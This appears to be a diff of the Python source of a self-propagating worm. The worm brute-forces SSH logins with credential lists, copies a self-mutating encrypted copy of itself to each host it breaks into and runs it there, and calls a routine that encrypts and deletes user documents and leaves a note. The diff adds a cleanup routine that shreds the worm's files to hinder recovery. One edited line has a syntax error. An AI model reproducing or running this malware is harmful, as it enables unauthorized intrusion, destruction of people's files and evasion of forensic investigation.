@@ -4,8 +4,8 @@ This worm does the following:
   - If the file is mutated (i.e. contains the AES‑GCM decryption wrapper),
     it decrypts and executes its worm body.
   - Otherwise, it scans for new target hosts (via SSH), infects them,
-    and then self‑mutates so that a new unique copy is used for the 
-    next propagation cycle.
+    and then self‑mutates so that a new unique copy is used for the next 
+    propagation cycle.
 """
 
 import sys, os, base64, uuid, socket, time, re, subprocess, threading, traceback, logging
@@ -58,9 +58,8 @@ PASSWORD_DICT = "password.txt"
 ALLOWED_SUBNETS = ["192.168.0.0/16", "10.0.0.0/16"]
 BLOCKED_SUBNETS = ["127.0.0.0/8", "169.254.0.0/16", "172.16.0.0/20", "224.0.0.0/4"]
 MIN_SUBNET_MASK = 24
-#propagation_threads = []
 
-# Logging configuration with colorized formatter
+# Logging configuration with a custom colorized formatter
 class ColorizedFormatter(logging.Formatter):
     grey = "\x1b[38;21m"
     yellow = "\x1b[33;21m"
@@ -184,34 +183,36 @@ def passive_remote_os(ssh):
 
 def detect_remote_os(ssh):
     """
-    Detect the remote operating system. Tries to run 'uname -s'.
-    If that fails, assumes the target is Windows.
+    Detect the remote operating system by running 'uname -s' once.
+    Returns "Linux" if the output contains Linux; otherwise "Windows".
     """
     passive_fingerprint = passive_remote_os(ssh)
     if passive_fingerprint == "Unknown":
         try:
             _, stdout, _ = ssh.exec_command("uname -s")
-            active_fingerprint = stdout.read().decode().strip()
-            if active_fingerprint:
-                logger.info(f"Detected remote OS via uname: {active_fingerprint}")
-                if "Linux" in active_fingerprint or "Darwin" in active_fingerprint:
+            remote_os = stdout.read().decode().strip()
+            if remote_os:
+                logger.info(f"Detected remote OS via uname: {remote_os}")
+                if "Linux" in remote_os or "Darwin" in remote_os:
                     return "Linux"
+            logger.info("Assuming remote OS is Windows")
+            return "Windows"
         except Exception:
-            pass  # 'uname -a' failed -> Windows
-        logger.info("Assuming remote OS is Windows")
-        return "Windows"
+            logger.info("Assuming remote OS is Windows")
+            return "Windows"
     else:
         logger.info(f"Detected remote OS via SSH banner: {passive_fingerprint}")
-        return passive_fingerprint
+        return passive_fingerprint    
 
-def get_remote_home_dir(ssh, remote_os=None):
-    """Returns the home directory on the remote host based on its OS."""
-    if remote_os is None:
-        remote_os = detect_remote_os(ssh)
+def get_remote_home_dir(ssh, remote_os):
+    """
+    Returns the home directory based on remote OS.
+    """
     try:
         if remote_os == "Linux":
             _, stdout, _ = ssh.exec_command("echo $HOME")
         else:
+            # For Windows, execute the command to echo the USERPROFILE variable.
             _, stdout, _ = ssh.exec_command("echo %USERPROFILE%")
         home_dir = stdout.read().decode().strip()
         if home_dir:
@@ -220,25 +221,25 @@ def get_remote_home_dir(ssh, remote_os=None):
             raise ValueError("Empty home directory returned")
     except Exception as e:
         logger.error(f"Error retrieving remote home directory: {e}")
+        # Fallback: for Linux use "~" (note this may not work with all SFTP clients)
         return "~" if remote_os == "Linux" else "%USERPROFILE%"
 
 def remote_path_join(ssh, remote_os, *parts):
     """
     Joins parts of a path using the appropriate separator for the remote OS.
-    Use '/' for Linux and '\\' for Windows.
+    It determines the remote OS via detect_remote_os(ssh) and then uses
+    '/' for Linux and '\\' for Windows.
     """
     if remote_os == "Linux":
         return "/".join(parts)
     else:
         return "\\".join(parts)
-
-def get_remote_exec_command(ssh, mutated_file, remote_os=None):
+    
+def get_remote_exec_command(ssh, mutated_file, remote_os):
     """
     Constructs the remote execution command for the mutated worm file
     based on the remote operating system.
     """
-    if remote_os is None:
-        remote_os = detect_remote_os(ssh)
     if remote_os == "Linux":
         cmd = f"cd ~/{REMOTE_DIR} && python3 {mutated_file}"
     else:  # Windows
@@ -252,7 +253,7 @@ def get_remote_exec_command(ssh, mutated_file, remote_os=None):
 def initiate_worm():
     """Perform scanning, infection, and mutation propagation."""
     # If infection note doesn't exist, perform zap operation.
-    if not os.path.isfile(f"{HOME_DIR}/openme.txt"):
+    if not os.path.isfile(os.path.join(HOME_DIR, "openme.txt"):
         zap_user_files()
     #Remove the debug log file if present -- uncomment if you want to examine each host's logs
     #if os.path.isfile("/tmp/dmsg.log"):
@@ -286,18 +287,11 @@ def initiate_worm():
         logger.info("Attempting SSH connection...")
         for host in hosts:
             if allowed(IPAddress(host)):
-                #t = threading.Thread(target=connect_via_ssh, args=(host,))
-                #t.start()
-                #propagation_threads.append(t)
                 connect_via_ssh(host)
-                #connect_via_ssh_ratelimited(host)
                 infection_done = True
                 break
         if infection_done:
             break
-
-    #for t in propagation_threads:
-    #    t.join()
 
     if not infection_done:
         if os.environ.get("SELF_MUTATED", "0") == "0":
@@ -306,9 +300,8 @@ def initiate_worm():
             self_mutate()
         else:
             logger.info("No new targets found and already self-mutated once. Terminating propagation.")
+            cleanup_scene()
             sys.exit(0)
-
-    #cleanup_local()
 
 def zap_user_files():
     """Encrypt and delete documents, then leave an informative note."""
@@ -367,6 +360,7 @@ def local_addresses():
     return ip_list, subnet_list
 
 def routes():
+    """Parse the system routing table to find network subnets."""
     if sys.platform.startswith("win"):
         try:
             routes_raw = subprocess.check_output(["route", "print", "-4"], shell=True).decode()
@@ -384,7 +378,6 @@ def routes():
                     continue
         return discovered
     else:
-        """Parse the system routing table to find network subnets."""
         try:
             routes_raw = subprocess.check_output(["ip", "route"]).decode()
         except Exception as e:
@@ -508,11 +501,9 @@ def connect_via_ssh(ip):
                             timeout=3, auth_timeout=3, banner_timeout=3,
                             allow_agent=False, look_for_keys=False)
                 logger.error(f"SSH login succeeded on {ip} with {user}:{passwd}")
-                
-                remote_os = detect_remote_os(ssh)    # Determine host OS only once after successful connection
-                spread(ssh, remote_os)
+                spread(ssh)
+                # After a successful infection, exit so that the new mutated copy takes over.
                 sys.exit(0)
-                #return
             except (AuthenticationException, BadHostKeyException):
                 logger.info("SSH authentication failed.")
             except (SSHException, EOFError) as e:
@@ -520,7 +511,7 @@ def connect_via_ssh(ip):
             except Exception as e:
                 logger.info(f"SSH connection error on {ip}: {str(e)}")
                 return
-
+            
 def connect_via_ssh_ratelimited(ip):
     """Attempt SSH login to a target IP using credential lists with rate-limiting and random delays."""
     ssh = paramiko.SSHClient()
@@ -556,7 +547,6 @@ def connect_via_ssh_ratelimited(ip):
                             allow_agent=False, look_for_keys=False)
                 logger.error(f"SSH login succeeded on {ip} with {user}:{passwd}")
                 spread(ssh)
-                # After a successful infection, exit so that the new mutated copy takes over.
                 sys.exit(0)
             except (AuthenticationException, BadHostKeyException):
                 logger.info("SSH authentication failed.")
@@ -572,11 +562,13 @@ def connect_via_ssh_ratelimited(ip):
             logger.info(f"Delaying for {delay:.2f} seconds before next SSH attempt.")
             time.sleep(delay)
 
-def spread(ssh, remote_os):
+def spread(ssh):
     """
     If the target is not already infected, mutate the worm,
     transfer it via SSH, and execute it remotely.
     """
+    remote_os = detect_remote_os(ssh)
+
     if check_remote_infection_marker(ssh, remote_os):
         logger.error("Remote host already infected. Skipping infection...")
         return
@@ -598,13 +590,19 @@ def spread(ssh, remote_os):
         if os.path.isfile(full_path):
             sftp.put(full_path, remote_path)
         else:
-            logger.info('Error transferring file: ' + filename)
+            try:
+                sftp.mkdir(remote_path)
+            except IOError:
+                pass
+            sftp.put_dir(full_path, remote_path)
     sftp.close()
 
     remote_cmd = get_remote_exec_command(ssh, mutated_file, remote_os)
     logger.error("Remote worm deployed. Executing worm via SSH...")
     t = threading.Thread(target=exec_remote_command, args=(ssh, remote_cmd))
     t.start()
+
+    cleanup_scene()
 
     # Flush logs and exit
     for handler in logger.handlers:
@@ -624,7 +622,7 @@ def self_mutate():
         handler.flush()
     os.execv(mutated_file_path, sys.argv)
 
-def check_remote_infection_marker(ssh, remote_os=None):
+def check_remote_infection_marker(ssh, remote_os):
     """Check if the target machine already has the worm installed."""
     sftp = ssh.open_sftp()
     try:
@@ -634,16 +632,29 @@ def check_remote_infection_marker(ssh, remote_os=None):
     sftp.close()
     return True
 
-def cleanup_local():
-    """Deletes all files in the directory containing the worm."""
+def cleanup_scene():
+    """
+    Securely clean up all files in the Temp directory using the 'shred' command,
+    then remove the Temp directory. This is intended to prevent recovery of the worm's files
+    after successful propagation.
+    """
+    temp_dir = os.path.join(HOME_DIR, REMOTE_DIR)
+    if not os.path.exists(temp_dir):
+        logger.info(f"Temp directory {temp_dir} does not exist. No cleanup needed.")
+        return
+    for filename in os.listdir(temp_dir):
+        file_path = os.path.join(temp_dir, filename)
+        if os.path.isfile(file_path):
+            try:
+                subprocess.check_call(["shred", "-u", file_path])
+                logger.info(f"Securely shredded and removed {file_path}")
+            except Exception as e:
+                logger.error(f"Failed to shred {file_path}: {e}")
     try:
-        for file_name in os.listdir(os.path.join(HOME_DIR, REMOTE_DIR)):
-            file_path = os.path.join(HOME_DIR, REMOTE_DIR, file_name)
-            os.remove(file_path)
-        os.rmdir(os.path.join(HOME_DIR, REMOTE_DIR))
-        logger.info(f"Deleted directory: {os.path.join(HOME_DIR, REMOTE_DIR)}")
+        os.rmdir(temp_dir)
+        logger.info(f"Removed Temp directory {temp_dir}")
     except Exception as e:
-        logger.error(f"Error during cleanup: {e}")
+        logger.error(f"Failed to remove Temp directory {temp_dir}: {e}")
 
 def load_entries(filename):
     """Load credential or log entries from a file."""
